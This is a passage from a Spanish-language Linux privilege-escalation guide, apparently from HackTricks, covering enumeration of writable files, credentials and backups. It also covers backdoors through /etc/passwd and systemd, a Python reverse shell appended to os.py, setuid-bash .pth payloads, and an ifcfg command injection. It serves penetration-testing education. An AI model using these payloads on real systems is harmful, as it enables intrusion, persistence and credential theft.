hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

P. ej.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Ahora puedes usar el comando `su` con `hacker:hacker`

Como alternativa, puedes usar las siguientes líneas para añadir un usuario ficticio sin contraseña.\
ADVERTENCIA: podrías reducir la seguridad actual de la máquina.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

NOTA: En las plataformas BSD, `/etc/passwd` se encuentra en `/etc/pwd.db` y `/etc/master.passwd`; además, `/etc/shadow` se renombra como `/etc/spwd.db`.

Deberías comprobar si puedes **escribir en algunos archivos sensibles**. Por ejemplo, ¿puedes escribir en algún **archivo de configuración de un servicio**?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Por ejemplo, si la máquina está ejecutando un servidor **tomcat** y puedes **modificar el archivo de configuración del servicio Tomcat dentro de /etc/systemd/,** entonces puedes modificar las líneas:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Tu backdoor se ejecutará la próxima vez que se inicie tomcat.

### Revisar carpetas

Las siguientes carpetas pueden contener copias de seguridad o información interesante: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Probablemente no podrás leer la última, pero inténtalo)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Ubicación extraña/Archivos propios

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Archivos modificados en los últimos minutos

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Archivos de bases de datos SQLite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

En las bases de datos de aplicaciones legibles, inspecciona los nombres de tablas y columnas en busca de nombres de usuario y hashes de contraseñas. Encontrar un hash, recuperar su contraseña y demostrar que se reutiliza para una cuenta local son pasos distintos; una cadena hexadecimal genérica de 32 caracteres no basta para inferir que es MD5 ni que permite acceder a una cuenta.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Si un historial de shell legible contiene un comando `sudo` seguido de una línea corta parecida a una contraseña, inspecciona manualmente las líneas cercanas. Una contraseña introducida en el prompt normal de `sudo` no se guarda en el historial de shell; una línea posterior solo podría ser una entrada accidental en la shell, no una prueba de que sea una contraseña válida. El marcador `.sudo_as_admin_successful` registra un uso anterior, no una autorización actual.

### Archivos ocultos

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Scripts/Binarios en PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Archivos web**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Copias de seguridad**

Inspecciona los archivos legibles dentro de los directorios de copias de seguridad, así como los archivos cuyos **nombres** contengan `backup`: un archivo con un nombre opaco o una extensión cifrada aún puede exponer datos antiguos de aplicaciones. Un archivo cifrado solo es un posible punto de exposición. La recuperación de la contraseña, la inspección de su contenido, la recuperación de un hash de aplicación y la reutilización de esa contraseña para una cuenta Unix son pasos independientes que deben verificarse; un hash en un archivo no demuestra que se pueda iniciar sesión localmente.

Las copias de seguridad legibles de máquinas virtuales también merecen esta revisión. Una configuración de VirtualBox `.vbox` puede identificar las imágenes `.vdi` conectadas e incluir metadatos de claves de disco cifradas; [VirtualBox documenta que la clave de datos cifrada se almacena en la configuración de la máquina virtual](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Tanto la configuración como la imagen deben ser accesibles para poder revisar el disco sin conexión. Un volumen del sistema invitado puede tener su propia [capa de cifrado LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), que requiere una clave independiente. Incluso después de un descifrado autorizado, los scripts o la configuración antiguos podrían contener una contraseña; confirma que la credencial siga siendo válida para una cuenta del host y que su política efectiva de `sudo` permita ejecutar un comando privilegiado antes de considerarlo una escalada local. Durante la enumeración pasiva, inventaría las rutas y los permisos sin copiar, descifrar ni montar las imágenes.

Al inspeccionar un archivo legible, enumera los nombres de sus elementos antes de extraer nada: puede contener archivos de autenticación ocultos, material de códigos de recuperación o claves SSH, aunque las copias en uso estén protegidas. Los nombres de archivo solo señalan una posible pista; verifica por separado el material y cualquier reutilización de cuentas.

Prioriza los **archivos legibles propiedad de otro usuario** en los directorios de copias de seguridad, sobre todo los archivos propiedad de root y aquellos a los que se pueda acceder mediante la pertenencia a un grupo. Un archivo antiguo puede contener una configuración o un secreto de autenticación aunque la copia en uso esté protegida. En una interfaz local para copias de seguridad como [Backrest](https://garethgeorge.github.io/backrest/), comprueba la cuenta efectiva del servicio y si un usuario con menos privilegios puede leer su configuración o autenticarse en la interfaz. Sus [hooks](https://garethgeorge.github.io/backrest/docs/hooks) y su [interfaz de comandos de restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) pueden operar con los privilegios de archivos y comandos del daemon; que el listener solo esté enlazado a loopback no determina por sí solo el impacto. `passwordBcrypt` de Backrest es un hash bcrypt codificado en base64 en su [código de autenticación](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), no una contraseña en texto plano. Confirma la identidad del servicio, que las credenciales sean utilizables y el acceso al plan o repositorio pertinente antes de considerar que un archivo o una interfaz expuestos constituyen un límite de privilegios.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Archivos conocidos que contienen contraseñas

Lee el código de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS); busca **varios archivos posibles que podrían contener contraseñas**.\
**Otra herramienta interesante** que puedes usar para esto es: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), una aplicación de código abierto que se usa para recuperar muchas contraseñas almacenadas en un equipo local con Windows, Linux o Mac.

Si `/etc/guacamole/guacamole.properties` se puede leer, revisa su configuración de conexión a bases de datos `mysql-*`, `postgresql-*` o `sqlserver-*`. Si la cuenta tiene autorización para leer las tablas JDBC de Guacamole, `guacamole_connection_parameter` puede contener valores guardados de `username`, `password`, `private-key` o `passphrase` para SSH. Empieza por los ID de conexión y los nombres de los parámetros; luego inspecciona solo las filas pertinentes. Un valor guardado puede ser un token dinámico o una referencia a un vault, en lugar de un secreto reutilizable. Consulta el [esquema JDBC de Guacamole](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) y los [parámetros de conexión SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

El [directorio de datos predeterminado de pswm](https://github.com/Julynx/pswm#usage) almacena un vault cifrado en `~/.local/share/pswm/pswm`. Si puedes ver el vault de otro usuario, comprueba quién es su propietario y si tu cuenta realmente puede leerlo. La ruta del vault por sí sola no revela credenciales; recuperar su contraseña maestra, encontrar una contraseña de cuenta reutilizable y confirmar los privilegios de esa cuenta son pasos distintos.

La [base de datos predeterminada de Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) está en `~/.passpie/`, con un llavero `.keys` y archivos de credenciales `.pass` cifrados en directorios de grupos. Que el directorio de la base de datos sea visible solo indica una posible ruta: confirma que puedes acceder a la clave y a la entrada cifrada pertinente, que dispones de cualquier frase de contraseña maestra necesaria y que la credencial recuperada pertenece a una cuenta con más privilegios. Passpie también admite [rutas de bases de datos personalizadas](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), por lo que la ruta predeterminada no es exhaustiva. La enumeración automatizada debe mostrar los metadatos sin exportar credenciales ni imprimir material de claves.

### Registros

Si puedes leer los registros, quizá encuentres **información interesante o confidencial en ellos**. Cuanto más extraño sea el registro, más interesante será (probablemente).\
Además, algunos **registros de auditoría** mal configurados (¿con backdoor?) pueden permitirte **registrar contraseñas** en ellos, como se explica en esta publicación: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Para poder **leer los logs, el grupo** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) será muy útil.

### Archivos de shell

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Búsqueda genérica de Creds/Regex

También deberías buscar archivos que contengan la palabra "**password**" en su **nombre** o dentro de su **contenido**, y buscar IPs y correos electrónicos en los logs, o regexps de hashes.\
No voy a enumerar aquí cómo hacer todo esto, pero si te interesa puedes revisar las últimas comprobaciones que realiza [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Archivos escribibles

### Python library hijacking

Si sabes **desde dónde** se ejecutará un script de Python y **puedes escribir dentro de** esa carpeta o puedes **modificar bibliotecas de Python**, puedes modificar la biblioteca del sistema operativo y hacerle un backdoor (si puedes escribir en la ubicación desde la que se ejecutará el script de Python, copia y pega la biblioteca os.py).

Para hacerle backdoor a la biblioteca, solo tienes que añadir al final de la biblioteca os.py la siguiente línea (cambia IP y PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### `.pth` escribible procesado por `site.addsitedir()`

No trates `site.addsitedir(DIR)` como equivalente a `sys.path.append(DIR)`. También procesa todos los archivos `*.pth` de `DIR`. Se ejecuta como código Python cualquier línea que empiece por `import` seguido de un espacio o una tabulación. En cambio, las líneas de rutas se resuelven en relación con el directorio del sitio y solo se añaden si existen.<sup>[[38]](#references)</sup>

Esto se convierte en una escalada de privilegios cuando un programa Python permitido por sudo o que se ejecuta con otros privilegios llama a `site.addsitedir()` sobre un directorio en el que el usuario actual o uno de sus grupos puede escribir. El código `.pth` se ejecuta mientras el programa privilegiado configura su ruta de importación, antes de que se ejecute su acción normal.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

El contenido ejecutable de `.pth` debe caber en una sola línea, pero los puntos y coma permiten incluir varias instrucciones. Por ejemplo, una ruta de ejecución como root puede crear una copia de Bash con setuid; ejecuta Bash con `-p` para que conserve su ID efectivo.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

La opción `-S` solo desactiva la inicialización automática de `site` de Python. No protege un programa que importe explícitamente `site` y llame a `site.addsitedir()`. Elimina los directorios modificables por un atacante de las rutas de importación privilegiadas y exige que el directorio y sus archivos `.pth` sean propiedad exclusiva del administrador privilegiado y que solo este pueda modificarlos.<sup>[[38]](#references)[[39]](#references)</sup>

### Explotación de logrotate

Un trabajo privilegiado de `logrotate` puede crear una ruta de escritura de archivos entre usuarios cuando rota un log ubicado bajo un directorio que un usuario con menos privilegios puede sustituir o redirigir durante la rotación. Que un log sea modificable solo es un indicio. Confirma la regla activa exacta y sus directivas `create`, `olddir` y `su`; la identidad efectiva del planificador; los permisos de escritura y búsqueda en el directorio padre del log; y si la compilación instalada y la política permiten cambiar el destino. Además, una shell privilegiada posterior debe cargar el archivo resultante para que una escritura en un archivo de inicio ejecute comandos. Inspecciona la programación, la regla, la versión y el empaquetado, y los metadatos de las rutas sin activar una rotación ni intentar la race.

> [!TIP]
> No trates `3.18.0` ni ninguna cadena de versión, por sí sola, como un límite de explotabilidad. El [registro de cambios de upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) registra medidas de protección contra directorios y symlinks en varias versiones, y las distribuciones pueden integrar correcciones retroactivamente. El [manual de upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) recomienda usar `su` cuando root rota logs en directorios controlados por usuarios sin privilegios; verifica la regla efectiva y el comportamiento real.

Puedes encontrar información más detallada sobre la vulnerabilidad en esta página: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Puedes explotar esta vulnerabilidad con [**logrotten**](https://github.com/whotwagner/logrotten).

Esta vulnerabilidad es muy similar a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logs de nginx),** así que, siempre que descubras que puedes alterar logs, comprueba quién los administra y si puedes escalar privilegios sustituyéndolos por symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referencia de la vulnerabilidad:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Un archivo `ifcfg-*` es un indicio que conviene investigar cuando un usuario con menos privilegios puede crearlo o modificarlo **y** una ruta privilegiada de activación de red leerá ese archivo concreto. Confirma los permisos efectivos del archivo y del directorio, la interfaz seleccionada, la implementación instalada de `ifup`/`ifdown` y quién la ejecuta. Que un archivo sea modificable no provoca ejecución por sí solo. La [guía de redes de RHEL 7 de Red Hat](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) distingue los scripts de red heredados de NetworkManager: este último no activa por sí mismo los primeros. [La documentación de RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) indica que su `ifup`/`ifdown` predeterminado usa NetworkManager, mientras que el paquete opcional heredado proporciona scripts de shell.

En un sistema que realmente use scripts heredados privilegiados, una asignación de `ifcfg-*` sin comillas y cargada como código shell, como `NAME=`, puede cruzar un límite de ejecución de código. Verifica el parser exacto, el valor y la ruta de activación; no deduzcas que se interpreta como shell por el nombre del archivo ni por la presencia de NetworkManager. Un wrapper permitido por sudo que escriba la entrada del usuario en un archivo `ifcfg-*` y luego llame a `ifup` heredado constituye otra ruta hacia este límite, incluso si quien lo ejecuta no puede modificar directamente el archivo.

Por ejemplo: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Ten en cuenta el espacio en blanco entre Network y /bin/id_)

### **init, init.d, systemd y rc.d**

El directorio `/etc/init.d` alberga **scripts** para System V init (SysVinit), el **sistema clásico de administración de servicios de Linux**. Incluye scripts para `start`, `stop`, `restart` y, a veces, `reload` servicios. Se pueden ejecutar directamente o mediante enlaces simbólicos ubicados en `/etc/rc?.d/`. En los sistemas Redhat existe una ruta alternativa: `/etc/rc.d/init.d`.

Por otro lado, `/etc/init` está asociado con **Upstart**, un **sistema de administración de servicios** más reciente, introducido por Ubuntu, que utiliza archivos de configuración para las tareas de administración de servicios. A pesar de la transición a Upstart, los scripts de SysVinit siguen utilizándose junto con las configuraciones de Upstart gracias a una capa de compatibilidad de Upstart.

**systemd** es un administrador moderno de inicialización y servicios que ofrece funciones avanzadas, como el inicio de daemons bajo demanda, la administración de automount y las instantáneas del estado del sistema. Organiza los archivos en `/usr/lib/systemd/` para los paquetes de distribución y en `/etc/systemd/system/` para las modificaciones del administrador, lo que agiliza la administración del sistema.<sup>[[21]](#references)</sup>

## Otros trucos

### Escalada de privilegios mediante NFS


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escapar de shells restringidas


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: abuso del canal de administración

Los Android rooting frameworks suelen interceptar una syscall para exponer funcionalidad privilegiada del kernel a un administrador en espacio de usuario. Una autenticación débil del administrador (p. ej., comprobaciones de firma basadas en el orden de los FD o esquemas de contraseña deficientes) puede permitir que una aplicación local suplante al administrador y escale a root en dispositivos que ya tienen root. Más información y detalles de explotación aquí:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Descubrimiento de servicios de VMware Tools y LPE (CWE-426) mediante exec basado en regex (CVE-2025-41244)

El descubrimiento de servicios basado en regex en VMware Tools/Aria Operations puede extraer una ruta binaria de las líneas de comandos de los procesos y ejecutarla con -v en un contexto privilegiado. Los patrones permisivos (p. ej., el uso de \S) pueden coincidir con listeners preparados por un atacante en ubicaciones con permisos de escritura (p. ej., /tmp/httpd), lo que puede conducir a la ejecución como root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Obtén más información y consulta aquí un patrón generalizado aplicable a otras pilas de descubrimiento y monitorización:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Protecciones de seguridad del kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Más ayuda

[Binarios estáticos de impacket](https://github.com/ropnop/impacket_static_binaries)

## Herramientas de privesc para Linux/Unix

### **La mejor herramienta para buscar vectores de escalada local de privilegios en Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(opción -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumera vulnerabilidades del kernel en Linux y MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (acceso físico):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilación de más scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)



## References

- [1] [0xdf – HTB Planning (escalada de privilegios mediante la interfaz de Crontab, reutilización de credenciales con zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: payload .text_sig falsificado para el monitor ejecutado por cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: evasión de Neighborhood Watch (secuestro de PATH mediante sudo env_keep)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Escalada básica de privilegios en Linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Guía de escalada de privilegios en Linux](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Ataque y defensa: técnicas de escalada de privilegios en Linux de 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [¡Nadie espera la ejecución de comandos!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (escalada de privilegios en Linux)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Guía de ejercicios de laboratorio - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: consejos y trucos para la escalada de privilegios en Linux](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: herramienta de enumeración y escalada de privilegios en Linux](https://github.com/rtcrowley/linux-private-i)
- [14] [¿Qué es un socket?](https://www.linux.com/news/what-socket/)
- [15] [Writeup de Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Conoce D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Escalada de privilegios en Linux mediante ejecutables SUID](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo, parte 2 – Escalada de privilegios en Linux](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Cómo administrar ACL en Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Root en Redhat/CentOS mediante network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [¿Qué es systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (inyección aritmética en bash mediante logs, cadena completa)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Manual de GNU Bash – BASH_ENV (archivo de inicio no interactivo)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + escalada de privilegios mediante enlace simbólico de TF_VAR)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (copia de pg_basebackup mediante cron → bash SUID)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Lo que nombres, VMware lo eleva (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: escalada de privilegios mediante Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – Vulnerabilidades de escalada de privilegios en Sudo CVE-2025-32462 y CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – Directorios de repositorios PYC](https://peps.python.org/pep-3147/)
- [32] [Documentación de Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet de @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Registro de contraseñas en Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Detalles de una condición de carrera de logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Documentación de Python 3.10 – `site` y archivos de configuración de rutas](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
